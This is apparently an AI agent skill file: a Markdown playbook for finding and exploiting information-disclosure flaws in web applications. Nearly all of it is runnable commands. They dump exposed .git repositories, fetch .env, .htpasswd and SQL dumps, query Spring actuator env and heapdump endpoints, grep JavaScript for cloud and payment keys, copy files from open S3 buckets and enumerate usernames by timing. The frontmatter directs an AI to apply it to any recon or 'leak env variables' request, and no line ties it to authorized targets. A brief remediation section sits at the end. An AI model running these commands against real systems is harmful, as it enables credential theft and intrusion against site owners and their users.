---
name: info-disclosure
description: >
  Expert guidance for finding, exploiting, and remediating Information Disclosure vulnerabilities.
  Covers source code leaks, git exposure, stack traces, verbose errors, directory listing, backup
  files, metadata leaks, JWT secrets in JS, cloud storage misconfig, robots.txt/sitemap leaks,
  debug endpoints, API schema exposure, environment variable leaks, and OSINT recon. Use this skill
  whenever the user mentions information disclosure, sensitive data exposure, git repo leak, source
  code exposure, stack traces leaking internals, verbose errors, directory listing, backup file
  discovery, .env file exposure, API key in JS, debug endpoints, cloud bucket exposure, or any
  unintended data leakage. Also trigger for "find hidden files", "discover sensitive endpoints",
  "find exposed git repo", "leak env variables", "extract secrets from JS". Always use this skill
  for any recon or sensitive data discovery task.
---

# Information Disclosure Skill — Finding & Exploiting Data Leaks

Information disclosure occurs when an app unintentionally reveals sensitive data — source code,
credentials, internal paths, user data, or system info — to unauthorized parties.

---

## 1. Attack Surface Map — Start Here

| Scenario | Section |
|----------|---------|
| Exposed `.git` repository | §3.1 |
| Backup / temp files | §3.2 |
| Directory listing | §3.3 |
| Verbose errors & stack traces | §3.4 |
| Debug endpoints & admin consoles | §3.5 |
| API schema / Swagger exposure | §3.6 |
| Secrets in JavaScript files | §3.7 |
| HTTP response headers leaking info | §3.8 |
| Metadata (EXIF, PDF, DOCX) | §3.9 |
| Cloud storage misconfiguration | §3.10 |
| Robots.txt / Sitemap / Security.txt | §3.11 |
| Source maps | §3.12 |
| Timing / side-channel | §3.13 |
| OSINT & passive recon | §3.14 |

---

## 2. Core Concepts

- **Active disclosure** — App explicitly returns sensitive data (stack trace, debug output).
- **Passive disclosure** — Data exists but isn't meant to be served (`.git/`, backup files).
- **Side-channel** — Timing, error wording, or response size reveals existence of data.
- **Supply chain** — Leaked secrets in JS bundles, source maps, or git history.

---

## 3. Attack Techniques

### 3.1 Exposed `.git` Repository

```bash
# Quick check
curl -s https://target.com/.git/HEAD
# → ref: refs/heads/main  =  VULNERABLE

# Automated dump with git-dumper
pip install git-dumper
git-dumper https://target.com/.git/ ./output-repo/

# Manual extraction of key files
curl https://target.com/.git/config
curl https://target.com/.git/COMMIT_EDITMSG
curl https://target.com/.git/logs/HEAD

# After dump — mine for secrets
cd output-repo
git log --all --oneline
git show HEAD:config.php
git diff HEAD~5 HEAD   # diff old commits for deleted secrets
grep -rE "(password|secret|api_key|token|key)\s*=" .
grep -rE "AKIA[0-9A-Z]{16}" .    # AWS keys

# Also check:
/.svn/entries     (SVN)
/.hg/hgrc         (Mercurial)
/.bzr/README      (Bazaar)
```

---

### 3.2 Backup & Temp Files

```bash
# Append common backup extensions to known filenames
for file in index login config database admin; do
  for ext in .bak .backup .old .orig .copy .tmp .swp .save .1 .2 ~; do
    echo "${file}${ext}"
    echo "${file}.php${ext}"
  done
done > backup-wordlist.txt

# Common backup paths
/backup/ /backups/ /bak/ /old/ /archive/ /tmp/
/var/backups/ /site-backup.zip /www.zip /html.tar.gz
/db.sql /database.sql /dump.sql /backup.sql /site.sql

# Vim swap files (left when editor crashes)
/.index.php.swp  /.login.php.swp  /.config.php.swp

# Common config file leaks
/.env            .env.local  .env.prod  .env.backup
/config.php      /config.yml  /config.json  /settings.py
/wp-config.php   /web.config  /app.config
/composer.json   /package.json  /requirements.txt  # dependency info
/Dockerfile      /docker-compose.yml
/.htpasswd       /.htaccess   /passwd

# ffuf scan for backup files
ffuf -u https://target.com/FUZZ \
     -w backup-wordlist.txt \
     -mc 200 -fc 404 \
     -t 40
```

---

### 3.3 Directory Listing

```bash
# Check every directory path you discover
curl -s https://target.com/uploads/
curl -s https://target.com/images/
curl -s https://target.com/files/
curl -s https://target.com/static/
curl -s https://target.com/assets/
curl -s https://target.com/js/
curl -s https://target.com/backup/
curl -s https://target.com/logs/

# Signs of listing: <title>Index of /path</title>
# or Apache/Nginx directory listing HTML

# Scan for directories with listing enabled
ffuf -u https://target.com/FUZZ/ \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mc 200 \
     -mr "Index of /" \
     -t 30
```

---

### 3.4 Verbose Errors & Stack Traces

```bash
# Trigger errors intentionally:
# 1. SQL syntax errors
GET /api/users?id='
GET /api/search?q=test'--
POST /api/data  {"id": null}

# 2. Type errors
GET /api/user/NOTANUMBER
GET /api/user/null
GET /api/user/undefined
GET /api/user/{}
GET /api/user/%00

# 3. Missing required parameters
GET /api/endpoint   (remove all params)
POST /api/action {}  (empty body)

# 4. Out-of-range values
GET /api/items?page=-1
GET /api/items?limit=999999999

# 5. Wrong content type
POST /api/json-endpoint
Content-Type: text/plain
body: not json

# What to extract from stack traces:
# - Framework + version (e.g., "Django 3.1.4")
# - Absolute file paths (/var/www/app/models/user.py)
# - Database type + query structure
# - Internal hostnames / IP addresses
# - Class names, method names, variable names
# - Third-party library names + versions
```

---

### 3.5 Debug Endpoints & Admin Consoles

```bash
# Spring Boot Actuator (very common)
/actuator
/actuator/env         # environment variables — often has credentials!
/actuator/configprops
/actuator/beans
/actuator/mappings    # all URL routes
/actuator/heapdump    # full JVM heap dump — extract with Eclipse MAT
/actuator/threaddump
/actuator/loggers
/actuator/health
/actuator/info

# Django debug
/?debug=true
/debug/
/__debug__/   # Django Debug Toolbar

# PHP info
/info.php  /phpinfo.php  /test.php  /info/  /?phpinfo=1

# Rails
/rails/info/properties
/rails/info/routes

# Node.js
/node_modules/.bin/  (if served statically)
/package.json

# Common debug params
?debug=true  ?debug=1  ?test=1  ?dev=true
?verbose=1   ?trace=1  ?dump=1  ?show_errors=1

# Admin consoles (check default credentials!)
/adminer.php      (DB admin)
/phpmyadmin/
/manager/html     (Tomcat)
/console          (Wildfly/JBoss)
/h2-console       (H2 in-memory DB)
/solr/            (Apache Solr)
/jenkins/
/grafana/
/kibana/
```

---

### 3.6 API Schema Exposure

```bash
# Swagger / OpenAPI
/swagger.json          /swagger.yaml
/swagger-ui.html       /swagger-ui/
/api-docs              /api-docs.json
/v1/api-docs           /v2/api-docs
/openapi.json          /openapi.yaml
/docs                  /redoc
/.well-known/openapi

# GraphQL introspection
POST /graphql   {"query":"{ __schema { types { name fields { name } } } }"}

# WSDL (SOAP services)
?wsdl              /service?wsdl
/api/service.wsdl

# gRPC reflection
grpcurl -plaintext target.com:50051 list

# Extract all endpoints from Swagger
python3 -c "
import json, sys
spec = json.load(open(sys.argv[1]))
for path, methods in spec.get('paths',{}).items():
    for m in methods:
        print(f'{m.upper()} {path}')
" swagger.json
```

---

### 3.7 Secrets in JavaScript Files

```bash
# Download all JS files
wget -r -l1 -A "*.js" https://target.com/

# Search for secrets
grep -rE "(api_key|apikey|api-key|secret|password|passwd|token|private_key)\s*[:=]\s*['\"][^'\"]{8,}" *.js
grep -rE "AKIA[0-9A-Z]{16}" *.js                    # AWS
grep -rE "sk_live_[0-9a-zA-Z]{24}" *.js             # Stripe
grep -rE "ghp_[A-Za-z0-9]{36}" *.js                 # GitHub
grep -rE "https?://[^\"']*:[^\"'@]*@[^\"']*" *.js   # URLs with credentials

# Find API base URLs and endpoints
grep -oE "(https?://[a-zA-Z0-9._/-]+api[a-zA-Z0-9._/-]*)" *.js | sort -u
grep -oE "\"(/api/[a-zA-Z0-9/_-]+)\"" *.js | sort -u

# Tools
# LinkFinder — endpoint discovery in JS
python3 linkfinder.py -i https://target.com/app.js -o cli

# Trufflehog — secret detection
trufflehog filesystem ./downloaded-js/

# SecretFinder
python3 SecretFinder.py -i https://target.com/app.js -o cli
```

---

### 3.8 HTTP Headers Leaking Info

```bash
# Check response headers on every request
curl -I https://target.com/

# Information-leaking headers:
Server: Apache/2.4.41 (Ubuntu)       # web server + version + OS
X-Powered-By: PHP/7.4.3              # backend language + version
X-Powered-By: Express                # Node.js Express
X-AspNet-Version: 4.0.30319          # .NET version
X-Generator: WordPress 6.0           # CMS
Via: 1.1 internal-proxy-hostname     # internal hostname!
X-Debug-Token: abc123                # Symfony debug
X-CF-App-Instance: app-guid          # Cloud Foundry app ID

# What to do with version info:
# Search NVD/CVE for known vulnerabilities in that exact version
# searchsploit apache 2.4.41
# searchsploit php 7.4.3
```

---

### 3.9 File Metadata (EXIF/PDF/DOCX)

```bash
# Images — EXIF data
exiftool image.jpg
# May contain: GPS coordinates, camera serial, OS username, software version

# PDF metadata
exiftool document.pdf
pdfinfo document.pdf
# May contain: author, creator app, company name, creation timestamp

# DOCX / Office files
unzip -p document.docx docProps/core.xml | python3 -m json.tool 2>/dev/null || \
  unzip -p document.docx docProps/core.xml
# May contain: author, last modified by, revision count, company

# Batch extract from website
wget -r -A "*.jpg,*.jpeg,*.png,*.pdf,*.docx,*.xlsx" https://target.com/
exiftool -r ./target.com/ 2>/dev/null | grep -E "(Author|Creator|GPS|Company|Last|Modified)"
```

---

### 3.10 Cloud Storage Misconfiguration

```bash
# AWS S3 — guess bucket names
for name in target target-backup target-dev target-prod target-assets target-uploads; do
  echo "Checking: https://${name}.s3.amazonaws.com/"
  curl -s "https://${name}.s3.amazonaws.com/" | grep -q "ListBucketResult" && echo "  OPEN LISTING!"
done

# S3 tools
aws s3 ls s3://target-bucket --no-sign-request
aws s3 cp s3://target-bucket/secrets.txt . --no-sign-request

# GCP Storage
curl -s "https://storage.googleapis.com/target-bucket/"
gsutil ls gs://target-bucket/

# Azure Blob
curl -s "https://targetaccount.blob.core.windows.net/container/?comp=list"

# Automated bucket finder
# pip install cloud-enum
cloud_enum -k target.com -l logfile.txt

# S3Scanner
python3 s3scanner.py --buckets-file buckets.txt

# Common bucket name patterns
target, target-dev, target-prod, target-staging, target-backup
target-assets, target-uploads, target-media, target-static
target-logs, target-exports, target-data, target-files
```

---

### 3.11 Robots.txt / Sitemap / Security.txt

```bash
# Always check these first
curl https://target.com/robots.txt
curl https://target.com/sitemap.xml
curl https://target.com/sitemap_index.xml
curl https://target.com/.well-known/security.txt

# Robots.txt often discloses hidden paths:
# Disallow: /admin/
# Disallow: /internal/
# Disallow: /api/private/
# Disallow: /backup/

# Extract all disallowed paths
curl -s https://target.com/robots.txt | grep "Disallow" | awk '{print $2}'

# Sitemap reveals all indexed URLs
curl -s https://target.com/sitemap.xml | grep -oE "<loc>[^<]+" | cut -d'>' -f2
```

---

### 3.12 JavaScript Source Maps

Source maps reveal original (pre-minified) source code including developer comments and logic.

```bash
# Check if .map files exist
curl -I https://target.com/static/app.js
# Look for: SourceMap: app.js.map  or  X-SourceMap: app.js.map

# Or at predictable paths
curl https://target.com/static/app.js.map
curl https://target.com/static/main.chunk.js.map

# Extract original source from map
npm install -g source-map-explorer
source-map-explorer app.js app.js.map

# Or use sourcemapper
python3 sourcemapper.py -url https://target.com/static/app.js.map -output ./src/
```

---

### 3.13 Timing / Side-Channel

```bash
# Username enumeration via timing
# Different response times for valid vs invalid usernames
time curl -s -X POST https://target.com/login \
          -d "username=admin&password=wrong"    # → 850ms (user exists, slow hash)
time curl -s -X POST https://target.com/login \
          -d "username=notexist&password=wrong" # → 10ms (user not found, fast exit)

# Consistent timing script
for user in admin root administrator user1 test; do
  start=$(date +%s%N)
  curl -s -X POST https://target.com/login -d "username=${user}&password=wrong" > /dev/null
  end=$(date +%s%N)
  echo "$user: $(( (end - start) / 1000000 ))ms"
done

# Error message enumeration
# "Invalid username" vs "Invalid password" = username confirmed valid
curl -s -X POST https://target.com/login -d "username=admin&password=x" | grep -oi "invalid.*"
```

---

### 3.14 OSINT & Passive Recon

```bash
# Google dorks
site:target.com filetype:pdf
site:target.com filetype:xls OR filetype:xlsx
site:target.com "api_key" OR "password" OR "secret"
site:target.com inurl:backup OR inurl:admin OR inurl:config
site:target.com ext:log OR ext:sql OR ext:bak
site:target.com "phpinfo()"

# GitHub secrets search
site:github.com "target.com" "password"
site:github.com "target.com" "api_key"
# Tools: GitLeaks, truffleHog, gitrob

# Shodan / Censys
shodan search "hostname:target.com"
shodan search "org:'TargetCompany' http.title:'Jenkins'"

# Wayback Machine — find old/removed files
curl "https://web.archive.org/cdx/search/cdx?url=target.com/*&output=text&fl=original&collapse=urlkey" \
     | grep -E "\.(php|asp|bak|sql|zip|tar|gz|env|config)"

# Certificate transparency — subdomains
curl "https://crt.sh/?q=%.target.com&output=json" | python3 -m json.tool | grep '"name_value"'

# Common.txt + wordlists on all discovered domains
ffuf -u https://FUZZ.target.com/ \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -mc 200,301,302
```

---

## 4. High-Value Targets Summary

| File/Endpoint | What It Leaks |
|--------------|--------------|
| `/.env` | DB creds, API keys, JWT secrets |
| `/.git/` | Full source code + git history |
| `/actuator/env` | All env vars including passwords |
| `/phpinfo.php` | PHP config, server paths, env vars |
| `app.js.map` | Unminified frontend source code |
| `/backup.sql` | Entire database dump |
| `/swagger.json` | All API endpoints + parameters |
| S3 public bucket | User data, backups, credentials |
| EXIF metadata | GPS coords, employee usernames |
| Stack traces | DB queries, file paths, versions |

---

## 5. Remediation

1. **Error handling** — Generic error messages in production; detailed only in dev.
2. **Disable directory listing** — `Options -Indexes` (Apache), `autoindex off` (Nginx).
3. **Protect `.git`** — Block `/.git/` access at web server level; never deploy with `.git/`.
4. **Scan JS bundles** — Run truffleHog/GitLeaks in CI pipeline before deploy.
5. **Source maps** — Don't deploy `.map` files to production; serve privately or not at all.
6. **Disable debug endpoints** — Actuator, phpinfo, debug toolbars in production.
7. **Strip server headers** — `ServerTokens Prod` (Apache), `server_tokens off` (Nginx).
8. **Bucket policies** — Default-deny on all cloud storage; audit regularly.
9. **Rotate exposed secrets** — Treat any disclosed secret as compromised immediately.

---

## 6. Info Disclosure Testing Checklist

- [ ] Check `/.git/HEAD`, `/.svn/`, `/.env`, `/.htpasswd`
- [ ] Check `robots.txt`, `sitemap.xml`, `security.txt`
- [ ] Fuzz for backup files (`.bak`, `.old`, `.tmp`, `.swp`)
- [ ] Test for directory listing on all discovered directories
- [ ] Trigger errors with invalid input (null, SQL chars, wrong types)
- [ ] Hit Spring Boot actuator endpoints
- [ ] Check for Swagger/OpenAPI/GraphQL introspection
- [ ] Download all JS files and grep for secrets + API endpoints
- [ ] Check `.js.map` source map files
- [ ] Inspect response headers for version/server info
- [ ] Extract EXIF from downloaded images
- [ ] Check cloud storage buckets (S3, GCS, Azure)
- [ ] Run Shodan/Censys for the target org
- [ ] Search GitHub/GitLab for the target domain
- [ ] Check Wayback Machine for old sensitive files
